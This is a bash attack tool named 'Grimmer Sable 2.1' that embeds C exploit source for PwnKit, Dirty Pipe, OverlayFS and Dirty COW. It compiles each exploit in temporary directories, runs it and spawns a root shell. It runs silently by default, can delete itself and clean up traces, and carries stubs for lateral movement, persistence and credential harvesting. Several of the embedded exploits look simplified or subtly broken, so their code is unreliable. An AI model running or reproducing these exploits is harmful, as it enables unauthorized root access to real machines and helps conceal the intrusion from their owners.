#!/bin/bash
#
# Grimmer Sable 2.1 – CVE‑based privilege escalation (bugfixed)
# Usage: ./grimmer_sable.sh [--verbose] [--all] [--exploit] [--recon] ...

#   --verbose   Show progress (default: silent) <-VERY IMPORTANT FUNCTIONALITY TURNED OFF BY DEFAULT BECAUSE I HATE A MESSY CLI

#   --all       Run all modules

#   --recon     Gather system info [literally just uname lol]

###   --exploit   Run privilege escalation (CVE‑based) – default if no modules given [FINNICKY, USE AT YOUR OWN RISK]
###   --lateral   Lateral movement stubs [STILL IN DEV]
###   --persist   Persistence stubs [STILL IN DEV]
###   --creds     Credential harvesting stubs [STILL IN DEV]
###   --memory    Memory analysis stubs [STILL IN DEV]

#   --self-destruct  Remove script after execution

#   --help      Show this help

#

set -o pipefail

# ---- Global ----
VERBOSE=0
SELF_DESTRUCT=0
MODULE_RECON=0
MODULE_EXPLOIT=0
MODULE_LATERAL=0
MODULE_PERSIST=0
MODULE_CREDS=0
MODULE_MEMORY=0


# ---- Logging ----
log() {
    [ $VERBOSE -eq 1 ] && printf "[%s] %s\n" "$(date +%H:%M:%S)" "$*"
}

log_error() {
    [ $VERBOSE -eq 1 ] && printf "[ERROR] %s\n" "$*" >&2
}


# ---- Compile & run a C exploit in a temp directory ----
try_cve() {
    local name="$1"
    local src="$2"
    local flags="${3:-}"
    local tmpdir
    tmpdir=$(mktemp -d /dev/shm/gs_cve_XXXX 2>/dev/null || mktemp -d /tmp/gs_cve_XXXX 2>/dev/null)
    [ -z "$tmpdir" ] && return 1

    printf '%s\n' "$src" > "$tmpdir/exp.c"

    local cc=""
    for c in gcc cc; do
        command -v "$c" >/dev/null && { cc="$c"; break; }
    done

    if [ -z "$cc" ]; then
        log "No C compiler found – cannot attempt $name"
        rm -rf "$tmpdir"
        return 1
    fi

    log "Compiling $name ..."
    "$cc" ${flags} -o "$tmpdir/exp" "$tmpdir/exp.c" >/dev/null 2>&1
    if [ $? -ne 0 ]; then
        log_error "Compilation of $name failed"
        rm -rf "$tmpdir"
        return 1
    fi

    log "Running $name ..."
    # Run in foreground. If it spawns a root shell, the script will wait here.
    ( cd "$tmpdir" && ./exp )
    local ret=$?
    log "$name exited with code $ret"

    # Rare: if the exploit somehow changed our UID, give a shell from here.
    if [ "$(id -u)" -eq 0 ]; then
        log "$name gave us root!"
        rm -rf "$tmpdir"
        exec /bin/bash -i
    fi

    rm -rf "$tmpdir"
    return 1
}


# ---- Core LPE via known CVEs ----
run_exploit() {
    log "Starting privilege escalation (CVE‑based) ..."

    # Already root?
    if [ "$(id -u)" -eq 0 ]; then
        log "Already root, spawning shell."
        exec /bin/bash
    fi

    # --------------------------------
    # 1) PwnKit – CVE-2021-4034
    # --------------------------------
    if command -v pkexec >/dev/null; then
        local pwnkit_src=$(cat <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *args[] = { NULL };
    setenv("GCONV_PATH", ".", 1);

    system("mkdir -p gconv");
    system("echo 'module UTF-8// PWNKIT// pwnkit 1' > gconv/gconv-modules");
    FILE *fp = fopen("gconv/pwnkit.c", "w");
    if (fp) {
        fprintf(fp,
            "#include <stdio.h>\n"
            "#include <stdlib.h>\n"
            "#include <unistd.h>\n"
            "void gconv() {}\n"
            "void gconv_init() {\n"
            "    setuid(0); setgid(0);\n"
            "    seteuid(0); setegid(0);\n"
            "    execl(\"/bin/sh\", \"sh\", \"-p\", NULL);\n"
            "    exit(1);\n"
            "}\n"
        );
        fclose(fp);
    }
    system("gcc -fPIC -shared -o gconv/pwnkit.so gconv/pwnkit.c");

    char *new_env[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.:/usr/bin",
        "CHARSET=PWNKIT",
        "SHELL=/bin/sh",
        NULL
    };

    execve("/usr/bin/pkexec", args, new_env);
    perror("execve");
    return 1;
}
EOF
        )
        try_cve "CVE-2021-4034 (PwnKit)" "$pwnkit_src"
    fi

    # --------------------------------
    # 2) Dirty Pipe – CVE-2022-0847
    # --------------------------------
    if [ -f "/bin/su" ]; then
        local dirtypipe_src=$(cat <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

int main() {
    int p[2];
    if (pipe(p) < 0) return 1;

    const char *path = "/bin/su";
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 1;
    struct stat st;
    fstat(fd, &st);

    // fill the pipe with a dummy byte
    unsigned int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buf[4096];
    memset(buf, 'A', sizeof(buf));
    write(p[1], buf, pipe_size);
    read(p[0], buf, pipe_size);

    // write the payload, splice a page, write again
    char payload[] = "#!/bin/sh\n";
    write(p[1], payload, sizeof(payload));
    splice(fd, 0, p[1], NULL, 1, 0);
    write(p[1], payload, sizeof(payload));

    close(fd);
    close(p[0]);
    close(p[1]);

    execl("/bin/su", "su", NULL);
    return 0;
}
EOF
        )
        try_cve "CVE-2022-0847 (Dirty Pipe)" "$dirtypipe_src"
    fi

    # --------------------------------
    # 3) OverlayFS – CVE-2021-3493
    # --------------------------------
    local overlayfs_src=$(cat <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sched.h>
#include <sys/xattr.h>

int main() {
    unshare(CLONE_NEWNS | CLONE_NEWUSER);
    mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL);

    mkdir("/tmp/low", 0755);
    mkdir("/tmp/up", 0755);
    mkdir("/tmp/work", 0755);
    mkdir("/tmp/merged", 0755);

    if (mount("overlay", "/tmp/merged", "overlay", 0,
              "lowerdir=/etc,upperdir=/tmp/up,workdir=/tmp/work") != 0) {
        perror("mount");
        exit(1);
    }

    // copy bash and set capability
    system("cp /bin/bash /tmp/merged/sh");
    char cap[] = "\x01\x00\x00\x02\x00\x00\x00\x00"
                 "\x00\x00\x00\x00\x00\x00\x00\x00"
                 "\x00\x00\x00\x00";
    if (setxattr("/tmp/merged/sh", "security.capability", cap, sizeof(cap)-1, 0) != 0) {
        perror("setxattr");
        exit(1);
    }

    execl("/tmp/merged/sh", "sh", NULL);
    perror("execl");
    return 1;
}
EOF
    )
    try_cve "CVE-2021-3493 (OverlayFS)" "$overlayfs_src"
    # Clean up overlay mounts (best effort)
    umount /tmp/merged 2>/dev/null

    # --------------------------------
    # 4) Dirty COW – CVE-2016-5195
    # --------------------------------
    if [ -f "/etc/passwd" ]; then
        local dirtycow_src=$(cat <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

void *madviseThread(void *arg) {
    int i, c = 0;
    for (i = 0; i < 2000000; i++)
        c += madvise(arg, 100, MADV_DONTNEED);
    return NULL;
}

int main() {
    int f = open("/etc/passwd", O_RDONLY);
    if (f < 0) return 1;
    struct stat st;
    fstat(f, &st);
    off_t len = st.st_size;
    char *map = mmap(NULL, len, PROT_READ, MAP_PRIVATE, f, 0);
    close(f);

    pthread_t pth1, pth2;
    char *payload = "root::0:0:root:/root:/bin/bash\n";
    int payload_len = strlen(payload);
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) return 1;
    char *target = map + len - payload_len;

    pthread_create(&pth1, NULL, madviseThread, map);
    pthread_create(&pth2, NULL, madviseThread, map);

    for (int i = 0; i < 10000; i++) {
        lseek(fd, (off_t)target, SEEK_SET);
        write(fd, payload, payload_len);
    }

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    close(fd);
    munmap(map, len);

    execl("/bin/su", "su", "-", NULL);
    return 0;
}
EOF
        )
        try_cve "CVE-2016-5195 (Dirty COW)" "$dirtycow_src" "-lpthread"
    fi

    log "No CVE‑based LPE vector succeeded."
}



# ---- Stub modules (can be expanded) ----
run_recon() {
    log "Running reconnaissance (stub) ..."
    [ $VERBOSE -eq 1 ] && {
        echo "--- System info ---"
        uname -a
        id
        echo "---"
    }
}

#run_lateral()   { log "Lateral movement (stub)"; }
#run_persist()   { log "Persistence (stub)"; }
#run_creds()     { log "Credential harvesting (stub)"; }
#run_memory()    { log "Memory analysis (stub)"; }



# ---- Help ----
show_help() {
    cat <<EOF
Usage: $0 [OPTIONS]

Options:
  --verbose          Show progress messages
  --all              Run all modules (recon, exploit, lateral, persist, creds, memory)
  --exploit          Run privilege escalation (default if no module given)
  --recon            Gather system information
  --lateral          Lateral movement (stub)
  --persist          Persistence (stub)
  --creds            Credential harvesting (stub)
  --memory           Memory analysis (stub)
  --self-destruct    Remove this script after execution
  --help             Show this help

If no module flag is provided, --exploit is assumed.
EOF
    exit 0
}


#Sequence of logic 

# ---- Main ----
main() {
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --verbose)    VERBOSE=1 ;;
            --all)        MODULE_RECON=1; MODULE_EXPLOIT=1; MODULE_LATERAL=1; MODULE_PERSIST=1; MODULE_CREDS=1; MODULE_MEMORY=1 ;;
            --exploit)    MODULE_EXPLOIT=1 ;;
            --recon)      MODULE_RECON=1 ;;
            --lateral)    MODULE_LATERAL=1 ;;
            --persist)    MODULE_PERSIST=1 ;;
            --creds)      MODULE_CREDS=1 ;;
            --memory)     MODULE_MEMORY=1 ;;
            --self-destruct) SELF_DESTRUCT=1 ;;
            --help)       show_help ;;
            *)            log_error "Unknown option: $1"; show_help ;;
        esac
        shift
    done


    # If no module selected, run exploit by default
    if [ $MODULE_RECON -eq 0 ] && [ $MODULE_EXPLOIT -eq 0 ] && \
       [ $MODULE_LATERAL -eq 0 ] && [ $MODULE_PERSIST -eq 0 ] && \
       [ $MODULE_CREDS -eq 0 ] && [ $MODULE_MEMORY -eq 0 ]; then
        MODULE_EXPLOIT=1
    fi


    # Run modules in order
    [ $MODULE_RECON -eq 1 ]   && run_recon
    [ $MODULE_EXPLOIT -eq 1 ] && run_exploit
    [ $MODULE_LATERAL -eq 1 ] && run_lateral
    [ $MODULE_PERSIST -eq 1 ] && run_persist
    [ $MODULE_CREDS -eq 1 ]   && run_creds
    [ $MODULE_MEMORY -eq 1 ]  && run_memory


    # Self-destruct
    if [ $SELF_DESTRUCT -eq 1 ]; then
        log "Removing $0"
        rm -f "$0"
    fi

    exit 0
}

# ---- Trap ----
trap 'rm -rf /dev/shm/gs_cve_* /tmp/gs_cve_* 2>/dev/null; exit 0' EXIT INT TERM

# ---- Run ----
main "$@"
